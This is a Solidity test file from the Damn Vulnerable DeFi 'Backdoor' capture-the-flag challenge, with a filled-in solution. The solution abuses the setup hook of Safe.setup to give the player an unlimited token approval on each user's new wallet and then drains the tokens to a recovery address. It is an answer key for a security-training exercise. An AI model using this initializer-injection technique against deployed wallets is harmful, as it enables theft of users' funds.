// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";




contract BackdoorExploitHelper {

    function setupApprove(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}



contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // Exploit: The exploit involves creating a proxy wallet for each user,
        // which allows the attacker to execute arbitrary calls on behalf of the user.
        // By setting up an unlimited approval for the token transfer, the attacker can
        // drain the user's wallet without their consent.

        BackdoorExploitHelper backdoorExploitHelper = new BackdoorExploitHelper();
    
        bytes memory data = abi.encodeCall(
            backdoorExploitHelper.setupApprove,
            (address(token), player) 
        );

        for (uint i = 0; i < users.length; i++) {
            
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,            // Array of owners for the Safe wallet
                    1,                  // Threshold - minimum number of signatures required
                    address(backdoorExploitHelper), // Address to call during setup (exploit contract)
                    data,               // Data to be called on the to address
                    address(0),         // Fallback handler address (none)
                    address(0),         // Payment token address (none)
                    0,                  // Payment amount
                    payable(address(0)) // Payment receiver address (none)
                )
            );


            // Create the proxy wallet for the user, using the wallet registry as the callback
            walletFactory.createProxyWithCallback(
                address(singletonCopy), 
                initializer,
                0,
                walletRegistry
            );

            // Transfer tokens from the user's wallet to the recovery address
            address wallet = address(walletRegistry.wallets(users[i]));
            token.transferFrom(address(wallet), recovery, token.balanceOf(address(wallet)));
        }

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
